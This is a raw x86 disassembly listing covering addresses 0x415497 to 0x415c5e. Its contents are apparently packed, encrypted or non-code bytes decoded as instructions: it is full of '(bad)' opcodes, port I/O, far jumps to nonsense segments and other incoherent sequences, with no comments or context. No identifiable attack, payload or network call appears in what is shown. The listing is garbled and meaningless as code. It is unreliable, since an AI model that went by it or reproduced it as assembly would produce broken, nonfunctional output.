  415497:	ret    
  415498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415499:	into   
  41549a:	adc    BYTE PTR [esi+0x27],0xc6
  41549e:	(bad)  
  41549f:	jns    0x4154be
  4154a1:	add    edi,DWORD PTR [ecx+0x4a]
  4154a4:	adc    DWORD PTR [ecx-0x10d6ef4],0xf354a01
  4154ae:	pusha  
  4154af:	aam    0xe5
  4154b1:	arpl   WORD PTR [esi-0x41c8ade3],bp
  4154b7:	dec    edx
  4154b8:	in     al,dx
  4154b9:	lock mov edi,0x5c513ae5
  4154bf:	imul   ebp,DWORD PTR [edi+0x5a7563fa],0xffffff8f
  4154c6:	repz inc ebx
  4154c8:	lock mov ds:0xbb3b16bc,al
  4154ce:	mov    DWORD PTR [ebx-0x26b28ada],ebp
  4154d4:	jb     0x4154e5
  4154d6:	and    dl,al
  4154d8:	in     eax,0x21
  4154da:	js     0x4154fd
  4154dc:	add    dl,bh
  4154de:	aad    0xa7
  4154e0:	int3   
  4154e1:	mov    edx,0x959fd888
  4154e6:	push   esi
  4154e7:	je     0x415545
  4154e9:	pop    es
  4154ea:	inc    ecx
  4154eb:	adc    ebx,esi
  4154ed:	mov    dl,0x1b
  4154ef:	pop    esi
  4154f0:	cs push dx
  4154f3:	pop    ebp
  4154f4:	cwde   
  4154f5:	ret    
  4154f6:	gs ja  0x41553e
  4154f9:	xor    al,0x14
  4154fb:	sub    al,0x12
  4154fd:	ja     0x415571
  4154ff:	ror    BYTE PTR [ecx+edx*1-0x6c],0xf6
  415504:	xlat   BYTE PTR ds:[ebx]
  415505:	mov    al,0xc0
  415507:	or     BYTE PTR [ecx+0x70],0xed
  41550b:	mov    dh,0x95
  41550d:	or     dh,al
  41550f:	jo     0x415555
  415511:	add    DWORD PTR [edx+ecx*4+0x55],esp
  415515:	push   DWORD PTR [ebx+edi*1]
  415518:	int3   
  415519:	jp     0x415567
  41551b:	je     0x41558b
  41551d:	push   edx
  41551e:	pop    edx
  41551f:	adc    DWORD PTR [edi+0x37],ecx
  415522:	aaa    
  415523:	xchg   esp,eax
  415524:	dec    eax
  415525:	in     eax,0x34
  415527:	cmc    
  415528:	aam    0xd9
  41552a:	inc    edi
  41552b:	cdq    
  41552c:	inc    eax
  41552d:	add    eax,ebp
  41552f:	aas    
  415530:	loope  0x4154c9
  415532:	or     al,0xa
  415534:	or     DWORD PTR [edx-0x46],eax
  415537:	mov    WORD PTR [ecx+0x5a],?
  41553a:	adc    eax,0x81425c7b
  41553f:	inc    ecx
  415540:	mov    ch,0xa6
  415542:	clc    
  415543:	gs pop ds
  415545:	or     bh,BYTE PTR gs:[ebx-0xb]
  415549:	sbb    bl,BYTE PTR [eax]
  41554b:	xchg   esi,ecx
  41554d:	inc    DWORD PTR [esi+0x1202d84b]
  415553:	ins    DWORD PTR es:[edi],dx
  415554:	sahf   
  415555:	xchg   edi,eax
  415556:	jb     0x41556b
  415558:	mov    ah,0x40
  41555a:	fs out dx,eax
  41555c:	mov    DWORD PTR [esi+0x6a],ebx
  41555f:	or     edi,DWORD PTR [eax+0x1e1c782d]
  415565:	mov    eax,ds:0xeb60bfbf
  41556a:	sub    DWORD PTR [edx+0x1d],0x289b789b
  415571:	outs   dx,BYTE PTR ds:[esi]
  415572:	jo     0x4155a4
  415574:	rcl    edi,0x4
  415577:	xchg   edx,eax
  415578:	mov    DWORD PTR cs:[eax+eiz*2-0x5e],ebx
  41557d:	jg     0x4155de
  41557f:	or     cl,BYTE PTR [ebp+0x7b]
  415582:	mul    DWORD PTR [edi]
  415584:	sahf   
  415585:	mov    DWORD PTR [eax],0x93fe71bb
  41558b:	adc    BYTE PTR [ebx+0x56980720],ch
  415591:	mov    DWORD PTR [edi+0x36113ff9],edi
  415597:	cmc    
  415598:	test   BYTE PTR [ecx+edx*4+0x15c36dac],al
  41559f:	sbb    eax,0x3af238f0
  4155a4:	push   edi
  4155a5:	das    
  4155a6:	jge    0x4155d5
  4155a8:	lods   eax,DWORD PTR ds:[esi]
  4155a9:	pop    edx
  4155aa:	jge    0x415558
  4155ac:	cdq    
  4155ad:	in     eax,0x14
  4155af:	mov    bl,0x18
  4155b1:	rol    BYTE PTR [esi+ebp*8-0x40004ac0],0x87
  4155b9:	popf   
  4155ba:	cmp    DWORD PTR [ebx],0xea315c0e
  4155c0:	(bad)  
  4155c1:	fnstsw WORD PTR [edi]
  4155c3:	xchg   BYTE PTR [edx-0x77303867],ch
  4155c9:	inc    ebx
  4155ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155cb:	jne    0x41560e
  4155cd:	aam    0x58
  4155cf:	in     eax,0x1b
  4155d1:	mov    bh,0xf3
  4155d3:	cs mov edx,0x3c952e39
  4155d9:	fadd   st,st(7)
  4155db:	xor    eax,0xff225426
  4155e0:	jnp    0x415638
  4155e2:	add    edx,ebx
  4155e4:	and    al,0x85
  4155e6:	ret    0x611e
  4155e9:	jne    0x4155f6
  4155eb:	mov    bh,0x1
  4155ed:	jl     0x4155de
  4155ef:	mov    esi,0x30195a4a
  4155f4:	out    0x9e,eax
  4155f6:	inc    edi
  4155f7:	pop    edx
  4155f9:	popf   
  4155fa:	sub    BYTE PTR [ecx+0x69],0x65
  4155fe:	retf   
  4155ff:	cdq    
  415600:	lock popa 
  415602:	scas   al,BYTE PTR es:[edi]
  415603:	dec    ebp
  415604:	callw  0x8b7e
  415608:	push   es
  415609:	sahf   
  41560a:	aad    0x1e
  41560c:	xchg   BYTE PTR [ebx+0x56],cl
  41560f:	push   ss
  415610:	cmp    al,0xe4
  415612:	nop
  415613:	push   cs
  415614:	pop    ecx
  415615:	xor    ecx,DWORD PTR [edx+0x64]
  415618:	mov    BYTE PTR [ebp-0xcde6be2],dh
  41561e:	inc    ecx
  41561f:	repz fnstsw WORD PTR [ebp-0x14]
  415623:	lahf   
  415624:	test   al,0xde
  415626:	xlat   BYTE PTR ds:[ebx]
  415627:	and    edx,DWORD PTR [esi-0x2b04059b]
  41562d:	inc    ebp
  41562e:	in     al,dx
  41562f:	dec    edi
  415630:	call   0x7d8d3b0e
  415635:	(bad)  
  415637:	repnz inc ecx
  415639:	fld    TBYTE PTR [ebx]
  41563b:	ret    
  41563c:	stc    
  41563d:	fcmovnu st,st(3)
  41563f:	push   cs
  415640:	ins    BYTE PTR es:[edi],dx
  415641:	mov    cl,ch
  415643:	or     al,0x12
  415645:	in     al,0x12
  415647:	pushf  
  415648:	in     eax,dx
  415649:	cmovns ebp,eax
  41564c:	jne    0x5b059460
  415652:	clc    
  415653:	pop    ds
  415654:	mov    bl,0x1f
  415656:	mov    al,0xe3
  415658:	test   DWORD PTR [ebp+0x71],0xf0e22698
  41565f:	lea    ebp,[ecx-0x4f3faf03]
  415665:	push   ebp
  415666:	mov    cl,bl
  415668:	daa    
  415669:	(bad)  
  41566a:	das    
  41566b:	psllw  mm0,QWORD PTR [edx+0x42]
  41566f:	ret    0xa0cc
  415672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415673:	in     eax,0x90
  415675:	mov    eax,0xf2b5748d
  41567a:	and    al,0xbf
  41567c:	cmp    al,0x86
  41567e:	fbstp  TBYTE PTR [eax]
  415680:	sbb    dl,ah
  415682:	xor    dh,bl
  415684:	les    ecx,FWORD PTR [ecx+0x15b6614a]
  41568a:	call   0x83fb:0x764f525e
  415691:	dec    ecx
  415692:	jle    0x41565d
  415694:	sbb    eax,0x7a1f7015
  415699:	cwde   
  41569a:	(bad)  
  41569b:	repz or eax,0xb73bc320
  4156a1:	pop    eax
  4156a2:	jne    0x41564e
  4156a4:	sbb    ch,BYTE PTR [ebx-0x44]
  4156a7:	sbb    edi,DWORD PTR [edi]
  4156a9:	lea    ebp,[ebx]
  4156ab:	mov    bh,0x58
  4156ad:	push   ss
  4156ae:	xor    dl,bl
  4156b0:	xchg   edi,eax
  4156b1:	fmul   QWORD PTR [esi]
  4156b3:	mov    ecx,0xa1495ce6
  4156b8:	loope  0x4156cb
  4156ba:	ds stos DWORD PTR es:[edi],eax
  4156bc:	stos   BYTE PTR es:[edi],al
  4156bd:	mov    ds:0xb1025267,eax
  4156c2:	rcr    BYTE PTR [edi],cl
  4156c4:	xchg   DWORD PTR [edi+eiz*1],ebx
  4156c7:	shr    BYTE PTR [edx-0x4a],1
  4156ca:	int3   
  4156cb:	outs   dx,BYTE PTR ds:[esi]
  4156cc:	leave  
  4156cd:	daa    
  4156ce:	dec    ecx
  4156cf:	(bad)  
  4156d0:	retf   
  4156d1:	rol    DWORD PTR [esi-0x10],cl
  4156d4:	mov    ds:0x15249418,al
  4156d9:	sti    
  4156da:	mov    eax,0x740679a8
  4156df:	mov    ecx,0x62afdc77
  4156e4:	sub    BYTE PTR [ecx],ch
  4156e6:	fwait
  4156e7:	or     eax,0x19df05b5
  4156ec:	sbb    al,ch
  4156ee:	in     eax,dx
  4156ef:	dec    edi
  4156f0:	lahf   
  4156f1:	xchg   DWORD PTR [edx+0x3b],eax
  4156f4:	cmp    ebx,DWORD PTR [eax]
  4156f6:	mov    ecx,0xe630393c
  4156fb:	dec    DWORD PTR [ebp+edi*2+0x37]
  4156ff:	push   ecx
  415700:	out    dx,eax
  415701:	je     0x4156f7
  415703:	ficom  WORD PTR [ebp-0x1d]
  415706:	icebp  
  415707:	jle    0x415749
  415709:	inc    edx
  41570a:	popa   
  41570b:	push   eax
  41570c:	arpl   WORD PTR [edx],si
  41570e:	pop    ds
  41570f:	ror    BYTE PTR [edx+0x3a26f0d9],1
  415715:	cld    
  415716:	popf   
  415717:	retf   0x5790
  41571a:	imul   ecx,DWORD PTR [eax-0x30],0x5e
  41571e:	mov    ecx,edx
  415720:	adc    DWORD PTR [ebx-0xa38bf61],eax
  415726:	dec    edi
  415727:	in     eax,dx
  415728:	mov    esi,0xb4d7ba92
  41572d:	inc    edx
  41572e:	xor    BYTE PTR [ebx+0x5eb29eff],0xc3
  415735:	and    dh,ch
  415737:	mov    cl,dl
  415739:	imul   BYTE PTR [ebx]
  41573b:	add    dl,BYTE PTR [edi]
  41573d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41573e:	jg     0x4156f6
  415740:	jnp    0x4156df
  415742:	inc    edx
  415743:	iret   
  415744:	push   ecx
  415745:	jmp    0xb64f:0xdc7de99a
  41574c:	push   eax
  41574d:	sub    eax,0x26e85f73
  415752:	jne    0x41570f
  415754:	cwde   
  415755:	xor    eax,0xdc87b20e
  41575a:	adc    eax,0xcba1ce20
  41575f:	push   edi
  415760:	imul   eax,DWORD PTR [eax],0x59dd3dc3
  415766:	inc    BYTE PTR [edi+0x2544b6ae]
  41576c:	shl    BYTE PTR [eax+0x2c013a92],0xea
  415773:	das    
  415774:	in     al,dx
  415775:	jne    0x415723
  415777:	aad    0xb
  415779:	rcl    BYTE PTR [edi-0x31bc87cf],1
  41577f:	cld    
  415780:	iret   
  415781:	xchg   esp,eax
  415782:	scas   al,BYTE PTR es:[edi]
  415783:	sub    DWORD PTR [eax-0x11dc1306],esp
  415789:	mov    eax,ds:0xafe9fd28
  41578e:	sbb    dl,BYTE PTR [ebp+0x6d9754d0]
  415794:	mov    bl,0xc4
  415796:	int3   
  415797:	sbb    eax,0x46c92d82
  41579c:	(bad)  
  41579d:	ja     0x41575b
  41579f:	mov    al,ds:0x8607a927
  4157a4:	mov    es,WORD PTR [ebx+0x9703cd5]
  4157aa:	mov    ah,0x8a
  4157ac:	or     ebp,DWORD PTR [ebx+0x729ab85e]
  4157b2:	adc    eax,0x678c1b3a
  4157b7:	fnstenv [esi+eiz*4+0x7]
  4157bb:	stos   BYTE PTR es:[edi],al
  4157bc:	xchg   ecx,eax
  4157bd:	fsubr  QWORD PTR [edx]
  4157bf:	fwait
  4157c0:	push   ecx
  4157c1:	jne    0x415777
  4157c3:	dec    edi
  4157c4:	dec    ebx
  4157c5:	mov    BYTE PTR [ebx],ch
  4157c7:	lea    edi,[edx-0x448bef92]
  4157cd:	add    al,0x51
  4157cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157d0:	(bad)  
  4157d1:	mov    edi,0x731a82fc
  4157d6:	push   edi
  4157d7:	or     eax,DWORD PTR [ecx+0x3b397acf]
  4157dd:	std    
  4157de:	jg     0x41576d
  4157e0:	aaa    
  4157e1:	(bad)  
  4157e2:	cmc    
  4157e3:	push   ebx
  4157e4:	inc    ebx
  4157e5:	sub    edi,eax
  4157e7:	out    dx,al
  4157e8:	pusha  
  4157e9:	lea    ecx,[ecx]
  4157eb:	cs push esp
  4157ed:	int    0x5
  4157ef:	mov    ebx,0x9e7d9460
  4157f4:	in     eax,0xc6
  4157f6:	rcr    DWORD PTR [ebp+edi*1+0x7],1
  4157fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157fb:	loope  0x4157ba
  4157fd:	leave  
  4157fe:	dec    edx
  4157ff:	mov    bh,0x5d
  415801:	(bad)  
  415802:	clc    
  415803:	mov    ebp,DWORD PTR [eax]
  415805:	popf   
  415806:	jns    0x415821
  415808:	dec    edx
  415809:	inc    ebp
  41580a:	in     al,dx
  41580b:	sub    eax,0xab12eb3b
  415810:	mov    fs:0x157222c5,eax
  415816:	sbb    al,BYTE PTR [bx+0x2c]
  41581a:	aam    0x4b
  41581c:	sub    DWORD PTR ds:0xf33a26d3,edx
  415822:	mov    ch,0xef
  415824:	retf   
  415825:	ds stc 
  415827:	inc    ebx
  415828:	pop    es
  415829:	mov    edx,0x9361510b
  41582e:	add    DWORD PTR [edi+0x3b],eax
  415831:	sub    al,0x8d
  415833:	bswap  esp
  415835:	clc    
  415836:	xor    eax,0x77e864ff
  41583b:	dec    edx
  41583c:	cmp    ch,al
  41583e:	test   BYTE PTR [edi+0x14645a45],cl
  415844:	sub    BYTE PTR [ebx-0x3b],cl
  415847:	lahf   
  415848:	popf   
  415849:	dec    ebp
  41584a:	inc    ecx
  41584b:	pop    eax
  41584c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41584d:	adc    eax,0x6cffcf86
  415852:	sbb    DWORD PTR [eax+0x12],edx
  415855:	inc    ebp
  415856:	sahf   
  415857:	dec    esi
  415858:	(bad)  
  415859:	in     al,dx
  41585a:	ja     0x415870
  41585c:	in     al,0xd4
  41585e:	pop    eax
  41585f:	push   es
  415860:	jbe    0x41580c
  415862:	push   ss
  415863:	icebp  
  415864:	push   0xce402f82
  415869:	mov    ds:0x4a9b24c8,al
  41586e:	push   cs
  41586f:	jg     0x4157fd
  415871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415872:	popa   
  415873:	rol    edx,1
  415875:	dec    ecx
  415876:	sub    DWORD PTR [edx-0x55],ebp
  415879:	jno    0x415835
  41587b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41587c:	out    dx,eax
  41587d:	pop    eax
  41587e:	adc    eax,0x1f686c3f
  415883:	gs in  al,dx
  415885:	std    
  415886:	mov    edi,0x63e5838b
  41588b:	cmp    bh,BYTE PTR [eax]
  41588d:	xchg   DWORD PTR [eax],esi
  41588f:	imul   esp,DWORD PTR [edi],0xfffffffc
  415892:	pop    ss
  415893:	iret   
  415894:	or     DWORD PTR [ebx-0x2c],ebp
  415897:	call   FWORD PTR [eax]
  415899:	sub    esi,DWORD PTR [esi]
  41589b:	mov    edx,0x21058f89
  4158a0:	(bad)  
  4158a1:	scas   eax,DWORD PTR es:[edi]
  4158a2:	adc    DWORD PTR [ebx+0x3b],0x3b
  4158a6:	xchg   DWORD PTR [ecx+0x20],edx
  4158a9:	mov    ebx,0x99f65719
  4158ae:	repnz stos BYTE PTR es:[edi],al
  4158b0:	aaa    
  4158b1:	or     DWORD PTR [esp+eiz*4-0x40e225ca],ecx
  4158b8:	pop    esp
  4158b9:	inc    ebp
  4158ba:	or     esi,esi
  4158bc:	js     0x4158e8
  4158be:	or     DWORD PTR [ecx+0x5b],edi
  4158c1:	cmc    
  4158c2:	call   DWORD PTR [edx+0x12c62f43]
  4158c8:	lods   al,BYTE PTR ds:[esi]
  4158c9:	stos   DWORD PTR es:[edi],eax
  4158ca:	loopne 0x4158ff
  4158cc:	ins    DWORD PTR es:[edi],dx
  4158cd:	push   0x9
  4158cf:	ror    al,cl
  4158d1:	hlt    
  4158d2:	fucomp st(4)
  4158d4:	xchg   DWORD PTR [edx],ecx
  4158d6:	lods   al,BYTE PTR ds:[esi]
  4158d7:	cmp    bh,BYTE PTR ds:0x94e987cf
  4158dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158de:	inc    ebx
  4158df:	jae    0x41595d
  4158e1:	pop    esi
  4158e2:	jmp    0xd7dd:0x9a4c76d8
  4158e9:	inc    edi
  4158ea:	jae    0x4158cb
  4158ec:	inc    edi
  4158ed:	sbb    DWORD PTR [ecx-0x2332ca50],esp
  4158f3:	ret    0xc877
  4158f6:	jl     0x415900
  4158f8:	inc    esp
  4158f9:	mov    esi,0xe99115e2
  4158fe:	mov    esp,0x1e11bc9d
  415903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415904:	(bad)  
  415905:	icebp  
  415906:	jo     0x4158f4
  415908:	clc    
  415909:	and    dl,BYTE PTR [ebx+0x59]
  41590c:	sti    
  41590d:	push   esp
  41590e:	inc    edi
  41590f:	ds hlt 
  415911:	jnp    0x415941
  415913:	mov    ebp,0x669c214c
  415918:	cmp    DWORD PTR [ebx],edi
  41591a:	pop    esi
  41591b:	sahf   
  41591c:	mov    edi,0xa404274e
  415921:	mov    BYTE PTR [ebx],bl
  415923:	lahf   
  415924:	(bad)  
  415925:	pop    esi
  415926:	jno    0x41592c
  415928:	or     eax,0x2d4f20ed
  41592d:	aad    0x9a
  41592f:	data16 sti 
  415931:	shl    BYTE PTR [edi+0x32c9c9ea],cl
  415937:	push   cs
  415938:	inc    edx
  415939:	ficom  DWORD PTR [edi]
  41593b:	push   ss
  41593c:	push   cs
  41593d:	jecxz  0x415901
  41593f:	jne    0x4159ba
  415941:	(bad)  
  415942:	xchg   ecx,eax
  415943:	sub    al,0x13
  415945:	pop    ebp
  415946:	mov    cl,0x34
  415948:	inc    esi
  415949:	popf   
  41594a:	jns    0x4158de
  41594c:	std    
  41594d:	imul   eax,DWORD PTR [eax-0x3033755a],0xabde1b75
  415957:	das    
  415958:	jns    0x415994
  41595a:	cmp    DWORD PTR [esi],ebp
  41595c:	push   edx
  41595d:	dec    edi
  41595e:	fist   DWORD PTR [ebp-0x4170ad85]
  415964:	imul   esp,DWORD PTR [ebx+0x6722be60],0x9
  41596b:	push   edx
  41596c:	push   cs
  41596d:	inc    ecx
  41596e:	retf   0x14ce
  415971:	(bad)  
  415972:	jle    0x415904
  415974:	repz call 0xa432759d
  41597a:	js     0x4159ac
  41597c:	call   0x376c:0x5ebb7ba0
  415983:	mov    cl,0x81
  415985:	fcom   st(2)
  415987:	shl    BYTE PTR [edi-0xd],0x29
  41598b:	dec    ebp
  41598c:	jecxz  0x41596e
  41598e:	jo     0x415a02
  415990:	jo     0x415969
  415992:	jo     0x4159a4
  415994:	repnz shl DWORD PTR [ebp-0x6c],0xff
  415999:	sub    ch,0x90
  41599c:	(bad)  
  41599d:	je     0x4159d6
  41599f:	imul   edx,DWORD PTR [esi+esi*2+0x7ab60eb5],0x18ca216e
  4159aa:	add    BYTE PTR [ebp+0x68731a6c],dl
  4159b0:	sub    cl,0x3d
  4159b3:	jmp    0x559a94e3
  4159b8:	push   ds
  4159b9:	sar    dl,0x77
  4159bc:	mov    ecx,0x8b84e355
  4159c1:	inc    ebx
  4159c2:	mov    al,0x24
  4159c4:	adc    BYTE PTR [edx+0x7c0777e8],bl
  4159ca:	mov    DWORD PTR [ebx],esp
  4159cc:	das    
  4159cd:	retf   
  4159ce:	mov    esp,0x7f06d100
  4159d3:	and    DWORD PTR [ecx],eax
  4159d5:	mov    eax,ds:0x7e95aa00
  4159da:	out    dx,eax
  4159db:	xor    DWORD PTR [eax],ebp
  4159dd:	push   edx
  4159de:	and    al,0xc0
  4159e0:	or     dl,BYTE PTR [ebp+0x98b0c6b]
  4159e6:	jnp    0x415a11
  4159e8:	fiadd  WORD PTR [eax]
  4159ea:	mov    edx,0xd0828bb3
  4159ef:	cli    
  4159f0:	pcmpgtd mm2,QWORD PTR [ebx]
  4159f3:	test   al,0x7f
  4159f5:	pop    ebp
  4159f6:	pushf  
  4159f7:	mov    ebp,0x2bc60517
  4159fc:	push   cs
  4159fd:	push   ds
  4159fe:	add    al,0xfc
  415a00:	xor    al,0xe4
  415a02:	leave  
  415a03:	push   edi
  415a04:	pop    ss
  415a05:	call   0x3836:0x87f7e1a8
  415a0c:	add    eax,0x39e12cd2
  415a11:	mov    ah,0x99
  415a13:	dec    edi
  415a14:	adc    al,0x7
  415a16:	cwde   
  415a17:	test   eax,0x40c668d8
  415a1c:	adc    cx,WORD PTR [edi-0x4cc4eb0e]
  415a23:	cwde   
  415a24:	or     BYTE PTR [edi+esi*4],0x2c
  415a28:	xchg   edx,eax
  415a29:	js     0x4159ca
  415a2b:	shl    DWORD PTR [esi],cl
  415a2d:	sahf   
  415a2e:	dec    edx
  415a2f:	outs   dx,BYTE PTR ds:[esi]
  415a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a31:	inc    eax
  415a32:	repz in eax,0xae
  415a35:	ss scas al,BYTE PTR es:[edi]
  415a37:	ins    BYTE PTR es:[edi],dx
  415a38:	sub    BYTE PTR [esi+0x69],0x7c
  415a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a3d:	icebp  
  415a3e:	and    eax,0xf546f921
  415a43:	into   
  415a44:	xchg   ebp,eax
  415a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a46:	aad    0x15
  415a48:	mov    dh,0x1e
  415a4a:	(bad)  
  415a4b:	lods   eax,DWORD PTR ds:[esi]
  415a4c:	lods   eax,DWORD PTR ds:[esi]
  415a4d:	je     0x4159f7
  415a4f:	sbb    eax,0x8047a0a9
  415a54:	in     eax,dx
  415a55:	sahf   
  415a56:	leave  
  415a57:	xor    eax,0x2ccd2502
  415a5c:	mov    ebx,0x8bfd87aa
  415a61:	xchg   ebx,eax
  415a62:	nop
  415a63:	mov    ebx,edx
  415a65:	stos   BYTE PTR es:[edi],al
  415a66:	gs call 0x5613bf7d
  415a6c:	ret    
  415a6d:	sub    bh,BYTE PTR [ecx]
  415a6f:	mov    BYTE PTR [esi],al
  415a71:	cmp    ah,BYTE PTR ds:0x5aeebdd8
  415a77:	mov    dl,0xa5
  415a79:	scas   al,BYTE PTR es:[edi]
  415a7a:	sbb    esp,DWORD PTR [edx+0x5]
  415a7d:	push   edx
  415a7e:	fisttp QWORD PTR [ebx-0x30078f70]
  415a84:	or     dl,al
  415a86:	mov    bh,0xff
  415a88:	jbe    0x415a2d
  415a8a:	popf   
  415a8b:	lds    edi,FWORD PTR [ebx-0x27]
  415a8e:	(bad)  
  415a8f:	mov    esp,0x689bf3b0
  415a94:	jnp    0x415a1a
  415a96:	xchg   DWORD PTR [ebx-0x38],ecx
  415a99:	mov    BYTE PTR [eax],dh
  415a9b:	sbb    ah,ch
  415a9d:	or     cl,al
  415a9f:	js     0x415b19
  415aa1:	adc    ah,al
  415aa3:	mov    al,ds:0x50492fb0
  415aa8:	fiadd  DWORD PTR [ecx-0x2d80f21b]
  415aae:	mov    ds:0x4b79054,eax
  415ab3:	inc    eax
  415ab4:	pop    ss
  415ab5:	mov    ecx,0x3072b6df
  415aba:	and    edi,ebx
  415abc:	xor    ebp,edi
  415abe:	push   esi
  415abf:	fstp   TBYTE PTR [ebp+eiz*4+0x72]
  415ac3:	sti    
  415ac4:	js     0x415b14
  415ac6:	xchg   ebp,eax
  415ac7:	ret    
  415ac8:	call   0x8bfd78cb
  415acd:	les    esp,FWORD PTR [esi]
  415acf:	mov    ebp,DWORD PTR [esi]
  415ad1:	setge  BYTE PTR [esi]
  415ad4:	push   ss
  415ad5:	xchg   esp,eax
  415ad6:	lock mov WORD PTR [ebp-0x3f34cb54],fs
  415add:	(bad)  
  415ade:	in     eax,0xfa
  415ae0:	cmp    BYTE PTR [ebx+0x5d],0xa4
  415ae4:	xor    edx,ebp
  415ae6:	or     edi,DWORD PTR [bx+di+0x3e5f]
  415aeb:	xchg   esp,eax
  415aec:	mov    ds:0xe2a55b56,al
  415af1:	aad    0x34
  415af3:	test   esp,ebp
  415af5:	xor    BYTE PTR [eax+0x2ebbe3c4],bl
  415afb:	loop   0x415b0b
  415afd:	sbb    al,0x59
  415aff:	and    eax,0xa9c19f8f
  415b05:	xchg   edx,eax
  415b06:	test   eax,0x4b468a6d
  415b0b:	in     al,dx
  415b0c:	and    eax,ecx
  415b0e:	push   edx
  415b0f:	cli    
  415b10:	and    DWORD PTR [edi],esi
  415b12:	shl    DWORD PTR [ecx-0x14],0x54
  415b16:	loopne 0x415b2a
  415b18:	out    dx,eax
  415b19:	mov    ah,0x59
  415b1b:	mov    DWORD PTR [ebx-0x7a9e472d],esi
  415b21:	mov    edi,0x65c3e4a7
  415b26:	xchg   ebp,eax
  415b27:	into   
  415b28:	adc    cl,dl
  415b2a:	mov    edx,0x58bc912e
  415b2f:	push   edi
  415b30:	inc    ebx
  415b31:	or     BYTE PTR [ecx],al
  415b33:	cmp    al,0xa7
  415b35:	sahf   
  415b36:	test   al,0x52
  415b38:	mov    ebp,0x49517101
  415b3d:	push   eax
  415b3e:	mov    ds:0x70aa7c4f,eax
  415b43:	xchg   DWORD PTR [esi-0x5037bef4],ebx
  415b49:	je     0x415b27
  415b4b:	lds    esp,FWORD PTR [edi+0x251890f9]
  415b51:	bnd ja 0x415b88
  415b54:	test   al,0x1
  415b56:	js     0x415b59
  415b58:	jbe    0x415b66
  415b5a:	daa    
  415b5b:	jge    0x415b2e
  415b5d:	pop    edi
  415b5e:	test   eax,0xc06d8892
  415b63:	rcl    BYTE PTR [edi+0x7b632336],cl
  415b69:	cli    
  415b6a:	xchg   esi,eax
  415b6b:	mov    al,0x84
  415b6d:	jl     0x415aff
  415b6f:	ret    0xf5a1
  415b72:	gs int 0x61
  415b75:	lock into 
  415b77:	adc    esi,DWORD PTR [ebp+0x2a]
  415b7a:	mov    edx,0xec042780
  415b7f:	jns    0x415bf0
  415b81:	pop    edi
  415b82:	mov    edi,0xe03f0b13
  415b87:	jle    0x415b32
  415b89:	xor    esp,DWORD PTR [esi+edi*1]
  415b8c:	arpl   WORD PTR [ecx-0x79d164c],sp
  415b92:	push   ebp
  415b93:	push   0xffffffdd
  415b95:	mov    ebp,ecx
  415b97:	sub    esp,DWORD PTR [esi-0x7b534039]
  415b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b9e:	push   DWORD PTR [eax-0x5fa2dd42]
  415ba4:	xor    DWORD PTR [edx+eiz*8-0x2339b509],ebp
  415bab:	iret   
  415bac:	rcr    esp,1
  415bae:	push   ebp
  415baf:	mov    esi,0x6d3171e1
  415bb4:	add    dh,BYTE PTR [eax-0x73]
  415bb7:	cmp    eax,0xcde8ea41
  415bbc:	add    eax,0x498f2419
  415bc1:	ins    BYTE PTR es:[edi],dx
  415bc2:	aad    0xe4
  415bc4:	das    
  415bc5:	fwait
  415bc6:	hlt    
  415bc7:	ss push edi
  415bc9:	lea    edi,es:[esi+edx*4+0x3d]
  415bce:	in     eax,dx
  415bcf:	repz xchg edi,eax
  415bd1:	push   ss
  415bd2:	sub    eax,0x406cc568
  415bd7:	mov    eax,0xb918daac
  415bdc:	loopne 0x415c03
  415bde:	(bad)  
  415bdf:	fs inc esi
  415be1:	dec    edi
  415be2:	jnp    0x415b83
  415be4:	sub    DWORD PTR [edi-0x1e],eax
  415be7:	jmp    0x2910:0x9e7240d0
  415bee:	dec    ebp
  415bef:	or     al,0x44
  415bf1:	outs   dx,BYTE PTR ds:[esi]
  415bf2:	in     al,dx
  415bf3:	ja     0x415c3b
  415bf5:	loope  0x415c22
  415bf7:	repz adc BYTE PTR [ecx-0x6b],0x23
  415bfc:	push   eax
  415bfd:	(bad)
  415c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c01:	add    ebx,esi
  415c03:	and    dh,cl
  415c05:	std    
  415c06:	scas   al,BYTE PTR es:[edi]
  415c07:	mov    al,0x35
  415c09:	jne    0x415bbe
  415c0b:	or     DWORD PTR [edx+0x76d8f42e],edi
  415c11:	shl    BYTE PTR [esi+0x4b18cb55],0x5
  415c18:	arpl   cx,bx
  415c1a:	inc    ecx
  415c1b:	int    0x51
  415c1d:	scas   eax,DWORD PTR es:[edi]
  415c1e:	(bad)  
  415c1f:	out    dx,al
  415c20:	mov    dl,0xd2
  415c22:	fcmovnu st,st(5)
  415c24:	test   al,0xc4
  415c26:	inc    ecx
  415c27:	jo     0x415bc9
  415c29:	imul   ebx,DWORD PTR [esi-0x394ab756],0x7ac56ef9
  415c33:	xor    al,0x85
  415c35:	out    0xe1,al
  415c37:	test   BYTE PTR [edi+0x6c],al
  415c3a:	int    0x32
  415c3c:	fmul   st,st(3)
  415c3e:	or     edx,DWORD PTR [eax]
  415c40:	pop    edx
  415c41:	inc    ebp
  415c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c43:	cmp    ebp,DWORD PTR [ebp+0x1a]
  415c46:	lock sub ebp,ebp
  415c49:	pop    eax
  415c4a:	xchg   BYTE PTR [eax+0x58698744],dl
  415c50:	aad    0x25
  415c52:	outs   dx,DWORD PTR ds:[esi]
  415c53:	add    DWORD PTR [ecx-0x3c],edx
  415c56:	leave  
  415c57:	mov    eax,0xc3d6a075
  415c5c:	ins    BYTE PTR es:[edi],dx
  415c5d:	clc    
  415c5e:	(bad)  
